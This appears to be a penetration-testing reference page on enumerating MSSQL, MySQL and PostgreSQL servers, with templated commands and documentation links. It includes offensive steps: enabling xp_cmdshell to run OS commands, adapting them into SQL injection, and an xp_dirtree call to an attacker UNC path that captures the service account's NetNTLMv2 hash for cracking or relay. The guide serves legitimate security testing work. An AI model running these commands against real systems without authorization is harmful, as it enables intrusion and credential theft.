---
title: Database enumeration
order: 3
tags: [database, mssql, mysql, postgresql, sql]
---

## MSSQL

Domain credentials with Windows authentication. Use Kali's Impacket entry point:

```bash
impacket-mssqlclient '{{DOMAIN}}/{{USER}}:{{PASS}}@{{RHOST}}' -port {{RPORT}} -windows-auth
```

In the connected SQL session:

```sql
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT name FROM sys.databases;
```

[Pinned client source](https://github.com/fortra/impacket/blob/impacket_0_13_1/examples/mssqlclient.py), [version query](https://learn.microsoft.com/en-us/sql/t-sql/functions/version-transact-sql), [identity](https://learn.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql), [database catalog](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-databases-transact-sql).

## MSSQL command execution

Requires sysadmin or equivalent rights. Inside the connected mssqlclient session:

```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

`enable_xp_cmdshell` is an impacket client shortcut; the manual path is `sp_configure` plus reconfigure. When reaching the server through [stacked SQL injection](web/input-tests#sqlmap), adapt the same statements into the query. [Microsoft xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql), [Impacket mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py).

## MySQL

Prompts for the password; uppercase -P selects the TCP port.

```bash
mysql -h {{RHOST}} -P {{RPORT}} -u '{{USER}}' -p
```

```sql
SELECT VERSION();
SHOW DATABASES;
```

[Connection options](https://dev.mysql.com/doc/refman/8.4/en/connecting.html), [database listing](https://dev.mysql.com/doc/refman/8.4/en/show-databases.html), [version function](https://dev.mysql.com/doc/refman/8.4/en/information-functions.html#function_version).

## PostgreSQL

Prompts for the password. List databases before choosing one to connect to.

```bash
psql -h {{RHOST}} -p {{RPORT}} -U '{{USER}}' -W -l
```

TODO: verify an accessible initial database if listing fails; postgres is not guaranteed to exist or be accessible. [psql manual](https://www.postgresql.org/docs/current/app-psql.html).

## MSSQL UNC authentication

Inside an authenticated MSSQL session, a UNC path can make the database service account connect to Kali. Start the intended capture listener first, then trigger only this controlled path.

```sql
xp_dirtree '\\{{LHOST}}\share'
```

A captured response belongs to the service's execution identity. Crack NetNTLMv2 with [mode 5600](active-directory/credential-access#crack-a-captured-netntlmv2-response) or assess relay prerequisites separately. [Microsoft xp_dirtree](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-dirtree-transact-sql), [Responder SMB capture](https://github.com/lgandx/Responder).
